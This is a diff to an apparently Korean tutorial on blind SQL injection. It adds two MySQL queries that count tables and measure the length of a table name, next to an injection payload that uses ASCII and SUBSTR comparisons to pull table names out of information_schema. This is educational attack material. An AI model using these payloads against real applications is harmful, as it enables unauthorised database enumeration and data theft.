@@ -93,6 +93,17 @@ Example 1.
 ```
 [ID]’ and ASCII(SUBSTR(SELECT name From information_schema.tables WHERE table_type=’base table’ limit 0,1)1,1)) > 100 --
 ```
+
+```
+데이터베이스에 있는 테이블의 수를 검색
+select count(table_name) from information_schema.tables where table_schema=database()
+```
+
+```
+데이터베이스에 있는 첫번째 테이블명의 길이를 검색
+select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1
+```
+
 해당구문은 MySQL 에서 테이블 명을 조회하는 구문으로 limit 키워드를 통해 하나의 테이블만 조회하고, SUBSTR 함수로 첫 글자만, 그리고 마지막으로 ASCII 를 통해서 ascii 값으로 변환해준다. 
 
 만약에 조회되는 테이블 명이 Users 라면 ‘U’ 자가 ascii 값으로 조회가 될 것이고, 뒤의 100 이라는 숫자 값과 비교를 하게 된다.  
